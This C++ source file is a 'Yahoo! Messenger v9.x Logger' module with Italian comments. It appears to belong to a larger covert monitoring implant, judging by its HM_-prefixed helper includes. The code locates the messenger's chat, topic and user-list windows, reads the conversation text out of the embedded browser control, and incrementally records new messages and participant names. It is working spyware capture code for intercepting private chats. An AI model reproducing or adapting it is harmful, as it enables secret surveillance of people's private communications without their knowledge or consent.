/*
* Yahoo! Messenger v9.x Logger
*
* Coded by: Quequero
* Date: 22/May/2009
*
*/

#include <exception>
#include <new>
#include <stdio.h>
#include <iostream>
using namespace std;

#include "QYim9.h"
#include "..\HM_SafeProcedures.h"
#include "..\common.h"
#define MIN_SEARCH_LENGTH 200

PWCHAR QYim9::wChatTree[] = {
	L"ATL:007C07F0",
	L"YHTMLContainer",
	L"Internet Explorer_Server",
	0
};

PWCHAR QYim9::wChatUserListTree[] = {
	L"YSearchMenuWndClass",
	L"IMClass",
	L"SysListView32",
	0
};

QYim9::QYim9(HWND hw) : QYim8(hw)
{
	WCHAR wTopic[256];

	pwConv = NULL;

	hwChat = ole.GetHandleFromClass(wChatTree);
	hwUserList = ole.GetHandleFromClass(wChatUserListTree);

	if(HM_SafeGetWindowTextW(hw, wTopic, 256))
		properties.SetId(wTopic);
	else
		properties.SetId(L"");
}

QYim9::~QYim9()
{
	if(pwConv){
		delete[] pwConv;
		pwConv = NULL;
	}
}

BOOL QYim9::GrabHistory()
{
	//LONG uLines, uIndex, i;
	BSTR bChat = NULL;
	PWCHAR wTmp = NULL, wRes = NULL, wOld = NULL;
	UINT uCount = 0;

	if(!FNC(IsWindow)(ole.GetHandle()))
		return FALSE;

	if(hwChat == NULL)
		return FALSE;

	ole.SetHandle(hwChat);

	if(bFirstGrab){
		properties.ClearHistory();

		if(ole.GetValueFromIEContainer(&bChat) == FALSE || bChat == NULL){
			properties.SetUpdated(FALSE);
			ole.Clean();
			return FALSE;
		}

		if(FixString(bChat) == FALSE){
			SAFE_SYSFREESTR(bChat);
			return FALSE;
		}

		//wprintf(L"%s\n", pwConv);

		properties.SetHistory(pwConv);
		properties.SetUpdated(TRUE);

		SAFE_SYSFREESTR(bChat);
		bChat = NULL;
		bFirstGrab = FALSE;
		ole.Clean();
		return TRUE;
	}

	// Se siamo qui, non e' il primo grab
	// Tronca la history se e' gia' stata acquisita
	if(properties.GetAcquiredStatus()){
		properties.TruncateHistory();

		// Acquisiamo il contenuto della finestra
		if(ole.GetValueFromIEContainer(&bChat) == FALSE || bChat == NULL){
			ole.Clean();
			return FALSE;
		}

		if(FixString(bChat) == FALSE){
			SAFE_SYSFREESTR(bChat);
			return FALSE;
		}

		SAFE_SYSFREESTR(bChat);
		bChat = NULL;

		// Cerchiamo dove si trova l'ultima parte acquisita
		wRes = properties.wcsrstr(pwConv, properties.GetHistory());		

		if(wRes == NULL){
			properties.SetUpdated(FALSE);
		} else if(wRes == properties.GetHistory()){
			properties.SetUpdated(FALSE);
		}else{
			uCount = properties.GetHistoryLength();

			if(wcslen(wRes) == uCount){
				properties.SetUpdated(FALSE);
			}else{
				properties.ClearHistory();
				properties.SetHistory(wRes + uCount);
				properties.SetUpdated(TRUE);
			}
		}
	}else{ // Parti dall'ultima riga e confronta
		// Acquisiamo il contenuto della finestra
		if(ole.GetValueFromIEContainer(&bChat) == FALSE || bChat == NULL){
			ole.Clean();
			return FALSE;
		}

		// Cerca l'ultima riga della chat che abbiamo nella nostra history
		uCount = properties.GetHistoryLength();
		wTmp = properties.GetHistory();

		if(uCount > MIN_SEARCH_LENGTH)
			wTmp += uCount - MIN_SEARCH_LENGTH;

		if(!wcslen(bChat)){
			SAFE_SYSFREESTR(bChat);
			ole.Clean();
			return TRUE;
		}

		uCount = wcslen(bChat);

		if(FixString(bChat) == FALSE){
			SAFE_SYSFREESTR(bChat);
			return FALSE;
		}

		SAFE_SYSFREESTR(bChat);
		bChat = NULL;

		// Cerchiamo dove si trova l'ultima parte acquisita
		wOld = properties.wcsrstr(pwConv, properties.GetHistory());		

		// Cerchiamo dove si trova l'ultima parte acquisita
		wTmp = wcsstr(pwConv, wOld);	

		if(!wcsncmp(wTmp, properties.GetHistory(), uCount)){
			properties.SetUpdated(FALSE);
		}else{
			properties.AppendHistory(wTmp + uCount);
			properties.SetUpdated(TRUE);
		}
	}

	if(bChat)
		SAFE_SYSFREESTR(bChat);

	ole.Clean();
	return TRUE;
/*
	if(ole.SetInterface() == FALSE){
		ole.Clean();
		return FALSE;
	}

	if(ole.SetYimRecursiveInterface() == FALSE){
		ole.Clean();
		return FALSE;
	}

	uIndex = uLines = ole.RecursiveTypeCountFromYi(NULL, ROLE_SYSTEM_TEXT);

	if(uLines == -1 || uLines == 0){
		ole.Clean();
		return FALSE;
	}

	//
	//if(ole.GetYimSpecificLineFromContainer(NULL, &bChat, uLines - 1, ROLE_SYSTEM_TEXT) == FALSE || bChat == NULL){
	//	SAFE_SYSFREESTR(bChat);
	//  properties.SetUpdated(FALSE);
	//	ole.Clean();
	//	return FALSE;
	//}
	//SAFE_SYSFREESTR(bChat);
	//

	
	// A volte... Casualmente a quanto pare, YIM accoda alla lista una
	// riga vuota contenente solo uno spazio... Se lo troviamo facciamo
	// in modo di skipparlo.
	for(i = uIndex; i > 0 ; i--){
		if(ole.GetYimSpecificLineFromContainer(NULL, &bChat, i - 1, ROLE_SYSTEM_TEXT) == FALSE || bChat == NULL){
			SAFE_SYSFREESTR(bChat);
			properties.SetUpdated(FALSE);
			ole.Clean();
			return FALSE;
		}

		if(wcslen(bChat) == 1 && (!wcsncmp(bChat, L" ", 1) || bChat[0] == 0xA0))
			uLines--;
		else
			break;

		SAFE_SYSFREESTR(bChat);
		bChat = NULL;
	}

	SAFE_SYSFREESTR(bChat);
	bChat = NULL;

	uIndex = uLines;

	if(uLines < 1){
		ole.Clean();
		return FALSE;
	}


	// Se e' il primo grab di questo oggetto, prendi solo l'ultima
	// riga, in questo modo skippiamo tutta la history precedente.
	if(bFirstGrab){
		if(ole.GetYimSpecificLineFromContainer(NULL, &bChat, uIndex - 1, ROLE_SYSTEM_TEXT) == FALSE || bChat == NULL){
			SAFE_SYSFREESTR(bChat);
			bChat = NULL;
			properties.SetUpdated(FALSE);
			ole.Clean();
			return FALSE;
		}

		if(properties.SetHistory(bChat)){
			properties.SetUpdated(TRUE);
		}

		SAFE_SYSFREESTR(bChat);
		bChat = NULL;

		bFirstGrab = FALSE;
		ole.Clean();
		return TRUE;
	}

	// Se siamo qui, non e' il primo grab
	// Pulisci la history se e' gia' stata acquisita
	if(properties.GetAcquiredStatus()){
		properties.CleanHistory();

		// Cerca l'ultima riga della chat che abbiamo nella nostra history
		for(i = uLines; i > 0; i--){
			if(ole.GetYimSpecificLineFromContainer(NULL, &bChat, i - 1, ROLE_SYSTEM_TEXT) == FALSE || bChat == NULL){
				SAFE_SYSFREESTR(bChat);
				bChat = NULL;
				properties.SetUpdated(FALSE);
				ole.Clean();
				return FALSE;
			}

			if(properties.CompareLastLine(bChat)){
				uIndex = i;

				break;
			}

			SAFE_SYSFREESTR(bChat);
			bChat = NULL;
		}

		SAFE_SYSFREESTR(bChat);
		bChat = NULL;

		// Se c'e' qualche riga da acquisire, possiamo cancellare la history
		if(uIndex < uLines)
			properties.ClearHistory();

		// Se i e' uguale a uLines, non ci sono nuove righe, quindi torniamo
		for(i = uIndex; i < uLines; i++){
			if(ole.GetYimSpecificLineFromContainer(NULL, &bChat, i, ROLE_SYSTEM_TEXT) == FALSE || bChat == NULL){
				SAFE_SYSFREESTR(bChat);
				bChat = NULL;
				properties.SetUpdated(FALSE);
				ole.Clean();
				return FALSE;
			}

			if(properties.AppendHistory(bChat))
				properties.SetUpdated(TRUE);

			SAFE_SYSFREESTR(bChat);
			bChat = NULL;
		}
	}else{ // Parti dall'ultima riga e confronta
		// Cerca l'ultima riga della chat che abbiamo nella nostra history
		for(i = uLines; i > 0; i--){
			if(ole.GetYimSpecificLineFromContainer(NULL, &bChat, i - 1, ROLE_SYSTEM_TEXT) == FALSE || bChat == NULL){
				SAFE_SYSFREESTR(bChat);
				bChat = NULL;
				properties.SetUpdated(FALSE);
				ole.Clean();
				return FALSE;
			}

			if(properties.CompareLastLine(bChat)){
				uIndex = i;
				break;
			}

			SAFE_SYSFREESTR(bChat);
			bChat = NULL;
		}

		SAFE_SYSFREESTR(bChat);
		bChat = NULL;

		// Se i e' uguale a uLines, non ci sono nuove righe, quindi torniamo
		for(i = uIndex; i < uLines; i++){
			if(ole.GetYimSpecificLineFromContainer(NULL, &bChat, i, ROLE_SYSTEM_TEXT) == FALSE || bChat == NULL){
				SAFE_SYSFREESTR(bChat);
				bChat = NULL;
				properties.SetUpdated(FALSE);
				ole.Clean();
				return FALSE;
			}

			if(properties.AppendHistory(bChat))
				properties.SetUpdated(TRUE);

			SAFE_SYSFREESTR(bChat);
			bChat = NULL;
		}
	}

	ole.Clean();
	return TRUE;
*/
}

BOOL QYim9::GrabTopic()
{
	WCHAR wTopic[256] = {0};

	ole.SetHandle(hwMain);

	if(HM_SafeGetWindowTextW(ole.GetHandle(), wTopic, 256))
		properties.SetId(wTopic);
	else
		properties.SetId(L"");

	return TRUE;
}

/**
* Prende l'elenco dei partecipanti e lo mette nelle proprieta'.
*/
BOOL QYim9::GrabUserList()
{
	WCHAR wTopic[256] = {0};

	ole.SetHandle(hwMain);
	properties.ClearUsersList();

	if(HM_SafeGetWindowTextW(ole.GetHandle(), wTopic, 256)) {
		wstring strTopic = wTopic;
		size_t separator = strTopic.rfind(L"(");
		size_t last_separator = strTopic.rfind(L")");

		if(separator != string::npos) {
			strTopic = strTopic.substr(separator + 1, last_separator - separator - 1);
		}

		properties.AppendUser((WCHAR *)strTopic.c_str(), FALSE);
	} else
		properties.AppendUser(L"", TRUE);

	return TRUE;
}

BOOL QYim9::FixString(PWCHAR bChat)
{
	UINT uCount, i, j;

	if(pwConv){
		delete[] pwConv;
		pwConv = NULL;
	}

	if(bChat == NULL || wcslen(bChat) == 0)
		return FALSE;

	uCount = wcslen(bChat);

	pwConv = new(std::nothrow) WCHAR[uCount + 1];

	if(pwConv == NULL)
		return FALSE;

	ZeroMemory(pwConv, sizeof(WCHAR) * (uCount + 1));

	// YIM accoda alla fine di un messaggio la sequenza "\r\n ", ma
	// solo se non si tratta di una conferenza... 
	while(!wcsncmp(&bChat[uCount - 3], L"\r\n ", 3)){
		uCount -=3;
	};

	//memset(&pwConv[uCount - 3], 0x00, sizeof(WCHAR) * 3);

	for(i = 0, j = 0; i < uCount; i++){
		if(bChat[i] != '\r'){
			pwConv[j] = bChat[i];
			j++;
		}
	}


	uCount = j - 1;

	while(pwConv[uCount] == '\n'){
		uCount--;
	}

	pwConv[uCount + 1] = 0;

	return TRUE;
}